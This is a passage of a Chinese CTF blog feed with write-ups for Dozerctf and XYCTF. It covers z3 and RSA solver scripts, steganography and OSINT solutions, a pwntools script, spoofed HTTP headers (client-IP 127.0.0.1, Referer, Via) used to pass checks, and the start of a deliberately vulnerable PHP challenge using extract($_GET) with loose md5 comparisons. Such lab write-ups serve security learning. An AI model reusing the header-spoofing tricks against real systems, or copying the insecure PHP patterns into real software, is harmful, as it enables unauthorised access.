class="hljs-number">4</span> - nums[<span class="hljs-number">5</span>]) + <span class="hljs-number">4</span> + nums[<span class="hljs-number">6</span>] + <span class="hljs-number">3</span> + nums[<span class="hljs-number">7</span>] + <span class="hljs-number">5</span> - nums[<span class="hljs-number">8</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">9</span>]) + <span class="hljs-number">2</span> + nums[<span class="hljs-number">10</span>] + <span class="hljs-number">2</span> + nums[<span class="hljs-number">11</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">12</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">13</span>]) + <span class="hljs-number">4</span> == <span class="hljs-number">249</span>,<br>((((((nums[<span class="hljs-number">0</span>] * <span class="hljs-number">4</span> + nums[<span class="hljs-number">1</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">2</span>] - <span class="hljs-number">5</span>) + nums[<span class="hljs-number">3</span>] - <span class="hljs-number">2</span> - nums[<span class="hljs-number">4</span>] * <span class="hljs-number">2</span>) + nums[<span class="hljs-number">5</span>] + <span class="hljs-number">3</span> + nums[<span class="hljs-number">6</span>] - <span class="hljs-number">3</span> - nums[<span class="hljs-number">7</span>]) + <span class="hljs-number">3</span> - nums[<span class="hljs-number">8</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">9</span>] * <span class="hljs-number">3</span>) + nums[<span class="hljs-number">10</span>] * <span class="hljs-number">2</span> + nums[<span class="hljs-number">11</span>] * <span class="hljs-number">5</span> + nums[<span class="hljs-number">12</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">13</span>] - <span class="hljs-number">4</span> == <span class="hljs-number">422</span>,<br>((((((nums[<span class="hljs-number">0</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">1</span>] - <span class="hljs-number">3</span> - nums[<span class="hljs-number">2</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">3</span>] - <span class="hljs-number">2</span> - nums[<span class="hljs-number">4</span>] - <span class="hljs-number">5</span>) + nums[<span class="hljs-number">5</span>] * <span class="hljs-number">2</span> + nums[<span class="hljs-number">6</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">7</span>] - <span class="hljs-number">5</span>) + nums[<span class="hljs-number">8</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">9</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">10</span>]) + <span class="hljs-number">5</span> - nums[<span class="hljs-number">11</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">12</span>] * <span class="hljs-number">5</span>) + nums[<span class="hljs-number">13</span>] - <span class="hljs-number">4</span> == <span class="hljs-number">49</span>,<br>(((((((nums[<span class="hljs-number">0</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">1</span>]) + <span class="hljs-number">3</span> - nums[<span class="hljs-number">2</span>]) + <span class="hljs-number">4</span> - nums[<span class="hljs-number">3</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">4</span>] + <span class="hljs-number">5</span> - nums[<span class="hljs-number">5</span>] * <span class="hljs-number">3</span>) + nums[<span class="hljs-number">6</span>] + <span class="hljs-number">2</span> + nums[<span class="hljs-number">7</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">8</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">9</span>]) + <span class="hljs-number">3</span> - nums[<span class="hljs-number">10</span>] * <span class="hljs-number">5</span>) + nums[<span class="hljs-number">11</span>] * <span class="hljs-number">2</span> + nums[<span class="hljs-number">12</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">13</span>]) + <span class="hljs-number">2</span> == <span class="hljs-number">0</span>,<br>(((((((nums[<span class="hljs-number">0</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">1</span>]) + <span class="hljs-number">5</span> - nums[<span class="hljs-number">2</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">3</span>] + <span class="hljs-number">3</span> + nums[<span class="hljs-number">4</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">5</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">6</span>] * <span class="hljs-number">2</span> - nums[<span class="hljs-number">7</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">8</span>] * <span class="hljs-number">4</span>) + nums[<span class="hljs-number">9</span>] + <span class="hljs-number">4</span> + nums[<span class="hljs-number">10</span>] * <span class="hljs-number">4</span> - nums[<span class="hljs-number">11</span>]) + <span class="hljs-number">5</span> - nums[<span class="hljs-number">12</span>]) + <span class="hljs-number">4</span> + nums[<span class="hljs-number">13</span>] + <span class="hljs-number">4</span> == <span class="hljs-number">268</span>,<br>((((((nums[<span class="hljs-number">0</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">1</span>]) + <span class="hljs-number">3</span> - nums[<span class="hljs-number">2</span>]) + <span class="hljs-number">2</span> + nums[<span class="hljs-number">3</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">4</span>]) + <span class="hljs-number">4</span> + nums[<span class="hljs-number">5</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">6</span>]) + <span class="hljs-number">2</span> + nums[<span class="hljs-number">7</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">8</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">9</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">10</span>] - <span class="hljs-number">2</span> - nums[<span class="hljs-number">11</span>]) + <span class="hljs-number">5</span> + nums[<span class="hljs-number">12</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">13</span>] + <span class="hljs-number">4</span> == -<span class="hljs-number">162</span>,<br>((((((((nums[<span class="hljs-number">0</span>] + <span class="hljs-number">5</span> - nums[<span class="hljs-number">1</span>]) + <span class="hljs-number">4</span> + nums[<span class="hljs-number">2</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">3</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">4</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">5</span>] - <span class="hljs-number">5</span>) + nums[<span class="hljs-number">6</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">7</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">8</span>] * <span class="hljs-number">3</span>) + nums[<span class="hljs-number">9</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">10</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">11</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">12</span>] - <span class="hljs-number">5</span>) + nums[<span class="hljs-number">13</span>] + <span class="hljs-number">2</span> == -<span class="hljs-number">2</span>,<br>((((nums[<span class="hljs-number">0</span>] + <span class="hljs-number">4</span> + nums[<span class="hljs-number">1</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">2</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">3</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">4</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">5</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">6</span>] - <span class="hljs-number">3</span> - nums[<span class="hljs-number">7</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">8</span>]) + <span class="hljs-number">3</span> + nums[<span class="hljs-number">9</span>] - <span class="hljs-number">5</span> - nums[<span class="hljs-number">10</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">11</span>] + <span class="hljs-number">5</span> + nums[<span class="hljs-number">12</span>] * <span class="hljs-number">5</span> - nums[<span class="hljs-number">13</span>] - <span class="hljs-number">5</span> == <span class="hljs-number">433</span>,<br>(((((nums[<span class="hljs-number">0</span>] + <span class="hljs-number">4</span> + nums[<span class="hljs-number">1</span>] + <span class="hljs-number">4</span> + nums[<span class="hljs-number">2</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">3</span>] - <span class="hljs-number">2</span>) + nums[<span class="hljs-number">4</span>] - <span class="hljs-number">4</span>) + nums[<span class="hljs-number">5</span>] + <span class="hljs-number">3</span> - nums[<span class="hljs-number">6</span>] - <span class="hljs-number">4</span> - nums[<span class="hljs-number">7</span>] * <span class="hljs-number">2</span>) + nums[<span class="hljs-number">8</span>] - <span class="hljs-number">3</span>) + nums[<span class="hljs-number">9</span>] + <span class="hljs-number">2</span> + nums[<span class="hljs-number">10</span>] * <span class="hljs-number">3</span> - nums[<span class="hljs-number">11</span>] * <span class="hljs-number">4</span>) + nums[<span class="hljs-number">12</span>] + <span class="hljs-number">5</span> + nums[<span class="hljs-number">13</span>] * <span class="hljs-number">3</span> == <span class="hljs-number">515</span>,<br>]  <br>  <br><span class="hljs-comment"># 创建一个求解器对象  </span><br>s = Solver()  <br>  <br><span class="hljs-comment"># 将方程添加到求解器中  </span><br>s.add(eqns)  <br>  <br><span class="hljs-comment"># 检查是否有解  </span><br><span class="hljs-keyword">if</span> s.check() == sat:  <br>    <span class="hljs-comment"># 获取解  </span><br>    m = s.model()  <br>    <span class="hljs-comment"># 打印解  </span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>):  <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;nums<span class="hljs-subst">&#123;i&#125;</span> = <span class="hljs-subst">&#123;m[nums[i]]&#125;</span>&quot;</span>)  <br><span class="hljs-keyword">else</span>:  <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;方程组无解&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">14</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(m[nums[i]]))),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><span class="hljs-comment">#B@by_5yth0n&amp;z3</span><br><span class="hljs-comment">#Dozerctf&#123;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="我是尊者"><a href="#我是尊者" class="headerlink" title="我是尊者"></a>我是尊者</h2><p>看到wp挺离谱，这么简单</p><p><img src="/../../images/dozerctf2024/%E5%B0%8A%E8%80%85.png" alt="尊者"></p><p>Dozerctf{31de43b1a1fb565dabfa9ad8320f11de}</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XYCTFwp及个人复盘</title>
    <link href="/2024/04/26/XYCTFwp%E5%8F%8A%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%9B%98/"/>
    <url>/2024/04/26/XYCTFwp%E5%8F%8A%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%9B%98/</url>
    
    <content type="html"><![CDATA[<hr><p>前言:写一写做出来的题目，和对web不会题目的复盘。是菜狗写的差轻喷。</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>没难度吧，题目还没看到就被队友解决了。扫一下码就行了。</p><h2 id="熊博士"><a href="#熊博士" class="headerlink" title="熊博士"></a>熊博士</h2><p>下载，发现图片和一段类似flag的文字。对应xyctf，想到应该是古典密码埃特巴什码，找个网站一把梭就行。</p><p><img src="/../images/xyctf/%E7%86%8A%E5%8D%9A%E5%A3%AB.png" alt="熊博士"></p><h2 id="ez-隐写"><a href="#ez-隐写" class="headerlink" title="ez_隐写"></a>ez_隐写</h2><p>最外层是队友打开的，用的是360的解压，不明白原理，我也打不开。</p><p>打开之后里面的用软件跑一下密码是20240401(开赛日)，压缩包名字是watermark。</p><p>猜测应该是盲水印。</p><p><img src="/../images/xyctf/%E9%9A%90%E5%86%99.BMP" alt="隐写"></p><p>在网上锐化一下还是能看出来的。</p><p>XYCTF{159-WSX-IJN-852}</p><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>看一下是一个图片.<img src="/../images/xyctf/game.jpg" alt="game"></p><p>一脸懵，一开始以为是什么特殊加密，用Google搜图发现是一个游戏。得到答案。</p><p><img src="/../images/xyctf/game1.png" alt="game1"></p><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="zzl的护理小课堂"><a href="#zzl的护理小课堂" class="headerlink" title="zzl的护理小课堂"></a>zzl的护理小课堂</h2><p>一开始以为就是搜题目解答我还特地都写了，结果写到100还是不给(真傻啊)。直接看源码，搜索alert,没出，那就score，搜到关键。<img src="/../images/xyctf/zzl1.png" alt="zzl1"></p><p>那就很简单了，打个断点然后score&#x3D;101就行，注意flag是动态的。<img src="/../images/xyctf/zzl2.png" alt="zzl2"></p><h2 id="zip神之套"><a href="#zip神之套" class="headerlink" title="zip神之套"></a>zip神之套</h2><p>解压，猜不出来看看exe,这里需要用ida打开(什么居然考re,还好入了个门)。ida64打开，<img src="/../images/xyctf/zip.png" alt="zip"></p><p>里面是八位，继续盲猜开赛日，20240401，套在里面果然打开了。</p><p>继续打开，能直接打开里面的一个，估计flag是在另外一个zip里面，估计是明文攻击直接用ARPCH明文攻击，这样就能打开了（太懒了不放图了</p><h2 id="真-签到"><a href="#真-签到" class="headerlink" title="真&gt;签到"></a>真&gt;签到</h2><p>用软件跑一下密码654321.打开发现啥也没有，用010打开zip,发现开头有flag。</p><h2 id="EZ-Base1024-2"><a href="#EZ-Base1024-2" class="headerlink" title="EZ_Base1024*2"></a>EZ_Base1024*2</h2><p>下载文件用软件跑一下出答案，用base2048<img src="/../images/xyctf/base2048.png" alt="base2048"></p><h2 id="Osint1"><a href="#Osint1" class="headerlink" title="Osint1"></a>Osint1</h2><p>这是社工题，还挺好玩的，先用百度识图看一下。找到这篇文章。<a href="https://club.m.autohome.com.cn/bbs/threadowner/0f96f216d67eb3dc/97798149-1.html">链接</a>，确定了是在江苏省南通市，搜一下旁边是什么海，是黄海，那就差一条路了。然后我自己跑到google上面看看有没有实景的，再结合图片发现应该是在那个园区附近，还有大风车。(这里用的腾讯地图发现的，其他的都看不清<img src="/../images/xyctf/osint1.png" alt="osint1"></p><p>看着像估计就是这里了，把可能的结果都试一下，发现是滨海东路。</p><h2 id="Osint2"><a href="#Osint2" class="headerlink" title="Osint2"></a>Osint2</h2><p>图片给的是高铁站的图片给的提示是已经玩结束要回去了，在12306搜索一下车次每天只有一班g3293，龙门是在河南省，靠近这个高铁站的就只有几个景点，最后试出来是老君山(我还没爬过,悲伤.jpg)</p><h2 id="Ez-osint"><a href="#Ez-osint" class="headerlink" title="Ez_osint"></a>Ez_osint</h2><p>图片下载直接整破防了，试了几种常规的png隐写没找出来，用stegsolve发现了一个水印网址 <a href="https://www.hi2future.com/">链接</a>，一开始找到的是假flag,观察图片上面的时间直接去找原来的那封信，发现留言有flag(别样的社工题)。</p><h2 id="出题有点烦"><a href="#出题有点烦" class="headerlink" title="出题有点烦"></a>出题有点烦</h2><p>下载文件解压，用软件跑一遍是123456，解压，看到前面三个都不能正常看，用010打开，把开头重新编辑，正常可以看了，第一个图片是假的flag。试了一会之后发现用foremost第五个图像可以分离一个压缩包，提出来用软件跑一遍，密码是xyctf，打开里面是正确的flag.</p><h2 id="美妙的歌声"><a href="#美妙的歌声" class="headerlink" title="美妙的歌声"></a>美妙的歌声</h2><p>下载是wav音频，用Audacity打开，打开多视图发现频谱图好像有点东西，微调一会发现是有东西的</p><p><img src="/../images/xyctf/%E9%9F%B3%E9%A2%91.png" alt="音频"></p><p>这大概率不是直接的flag,应该是key,用deepsound打开，解密分离得到flag.txt，里面有flag,</p><p>XYCTF{T0uch_y0ur_he3rt_d55ply!!}</p><h2 id="Rosk-Paper-Scissors"><a href="#Rosk-Paper-Scissors" class="headerlink" title="Rosk,Paper,Scissors!"></a>Rosk,Paper,Scissors!</h2><p>也是受高人指点，可以进行手搓，一个一个试，只有开头的会随机变，脚本多跑几遍就行了。上代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">57882</span>)<br>a=[<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Scissors&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Rock&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>,<span class="hljs-string">&quot;Paper&quot;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    p.recvuntil(<span class="hljs-string">&quot;&quot;</span>)<br>    p.sendline(i)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="以下为复现（彩蛋"><a href="#以下为复现（彩蛋" class="headerlink" title="以下为复现（彩蛋"></a>以下为复现（彩蛋</h2><p>首先第一段应该是一个八进制转字符串</p><p><img src="/../images/xyctf/%E5%BD%A9%E8%9B%8B1.png"></p><p>然后第三段应该是二进制转字符串<img src="/../images/xyctf/%E5%BD%A9%E8%9B%8B2.png" alt="彩蛋2"></p><p>第二段说不需要扫描器，参考了其他师傅的wp，是下载图片转png图片，<a href="https://convertio.co/zh/">转化</a>，然后用zsteg得到<img src="/../images/xyctf/%E5%BD%A9%E8%9B%8B3.png" alt="彩蛋3"></p><p>审视了一下应该是键盘密码，<a href="http://wbic16.xedoloh.com/dvorak.html">键盘密码</a></p><p><img src="/../images/xyctf/%E5%BD%A9%E8%9B%8B4.png" alt="彩蛋4"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h3 id="happy-to-solve1"><a href="#happy-to-solve1" class="headerlink" title="happy_to_solve1"></a>happy_to_solve1</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> gmpy2<br><span class="hljs-attribute">from</span> Crypto.Util.number import *<br><br><br><span class="hljs-attribute">n</span> =  <span class="hljs-number">24852206647750545040640868093921252282805229864862413863025873203291042799096787789288461426555716785288286492530194901130042940279109598071958012303179823645151637759103558737126271435636657767272703908384802528366090871653024192321398785017073393201385586868836278447340624427705360349350604325533927890879</span><br><span class="hljs-attribute">c</span> =  <span class="hljs-number">14767985399473111932544176852718061186100743117407141435994374261886396781040934632110608219482140465671269958180849886097491653105939368395716596413352563005027867546585191103214650790884720729601171517615620202183534021987618146862260558624458833387692782722514796407503120297235224234298891794056695442287</span><br><span class="hljs-attribute">e</span> = <span class="hljs-number">65537</span><br><span class="hljs-attribute">t</span> = <span class="hljs-number">1</span><br><span class="hljs-comment"># 因为q是p的取反后取比其值大的最近的一个素数，所以p + q = 2**512 - 1 + t</span><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">300</span>):<br>    <span class="hljs-attribute">phi</span> = n - (<span class="hljs-number">2</span>**<span class="hljs-number">512</span> - <span class="hljs-number">1</span> + t) + <span class="hljs-number">1</span><br>    <span class="hljs-attribute">d</span> = gmpy2.invert(e, phi)<br>    <span class="hljs-attribute">m</span> = pow(c, d, n)<br>    <span class="hljs-attribute">print</span>(long_to_bytes(m))<br>    <span class="hljs-attribute">t</span> += <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><p>这部分就是闹着玩随便写写，我不会re就看看题目。所有也懒得放图了。</p><h2 id="聪明的信使"><a href="#聪明的信使" class="headerlink" title="聪明的信使"></a>聪明的信使</h2><p>这个用ida打开，然后空格一下就能看到明显类似flag的一段内容。</p><p>我记得好像是栅栏密码，网上一把梭就行了，没什么难度。</p><h2 id="你是真的大学生吗？"><a href="#你是真的大学生吗？" class="headerlink" title="你是真的大学生吗？"></a>你是真的大学生吗？</h2><p>这题有一丢丢借鉴别人，但是问题不大。同样也是用ida打开就行，找到关键内容就行，也是懒不想看了，（我又不是re手，直接上代码和答案。<img src="/../images/xyctf/%E5%A4%A7%E5%AD%A6%E7%94%9F.png" alt="大学生"></p><p><img src="/../images/xyctf/%E5%A4%A7%E5%AD%A6%E7%94%9F1.png" alt="大学生1">差不多吧，嘿嘿。</p><h2 id="DebugMe"><a href="#DebugMe" class="headerlink" title="DebugMe"></a>DebugMe</h2><p>这题其实我感觉挺简单的，具体操作不会，下载一个安卓模拟器，然后用jeb调debugger就行，就能出答案了，but 我不会，sorry啦。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>web真是心碎啊，发现自己不会的还是太多太多了，会把所有没写出来的也顺带复盘一下。</p><h2 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h2><p>diserach扫一下有flag.php和robots.txt,里面有账户和密码。</p><p>跟着要求在bp里面改就行了，考察一下头，wp如下。</p><p>User-Agent: XYCTF</p><p>client-Ip:127.0.0.1</p><p>via:ymzx.qq.com</p><p>Referer:yuanshen.com</p><p>Cookie:XYCTF</p><h2 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up"></a>warm up</h2><p>先上源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;next.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$XYCTF</span> = <span class="hljs-string">&quot;Warm up&quot;</span>;<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;val1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;val2&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;val1&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;val2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;val1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;val2&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ez&quot;</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;什么情况,这么基础的md5做不来&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$md5</span>) &amp;&amp; <span class="hljs-variable">$md5</span> == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ezez&quot;</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;什么情况,这么基础的md5做不来&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$XY</span> == <span class="hljs-variable">$XYCTF</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$XY</span> != <span class="hljs-string">&quot;XYCTF_550102591&quot;</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$XY</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;XYCTF_550102591&quot;</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> 